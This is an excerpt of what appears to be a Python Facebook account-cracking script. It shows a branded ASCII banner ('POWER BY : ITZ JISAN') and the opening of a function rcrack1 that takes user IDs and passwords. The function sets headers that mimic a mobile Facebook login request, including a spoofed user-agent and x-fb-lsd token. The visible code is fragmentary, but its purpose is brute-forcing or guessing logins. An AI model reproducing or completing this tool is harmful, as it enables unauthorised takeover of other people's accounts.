...
`.____.' |_____| \______.'|____| |____|_____|\____| 
    ...
    │ [✓] POWER BY : \033[1;32m ITZ JISAN \033[1;37m           │
    └───────────────────────────────────────┘""")
...
def rcrack1(uid,pwx,tl):
    ...
    'referer': 'https://web.facebook.com/login.php/?_rdc=1&_rdr',
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; Redmi 8A Dual) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'x-asbd-id': '198387',
    'x-fb-lsd': 'AVoavx2nUjg',
}
